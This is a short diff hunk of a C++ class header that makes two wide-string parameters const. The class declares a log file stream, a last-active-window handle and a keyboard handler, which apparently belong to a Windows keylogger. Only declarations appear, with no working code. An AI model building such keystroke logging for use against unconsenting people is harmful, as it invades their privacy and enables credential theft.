@@ -25,9 +25,9 @@ private:
 	ofstream logFile;
 	HWND lastActiveWindow;
 
-	void keyboardHandler(wchar_t* key);
+	void keyboardHandler(const wchar_t* key);
 
 	static char charBuffer[1024];
-	static string wcharToStr(wchar_t* str);
+	static string wcharToStr(const wchar_t* str);
 };
 
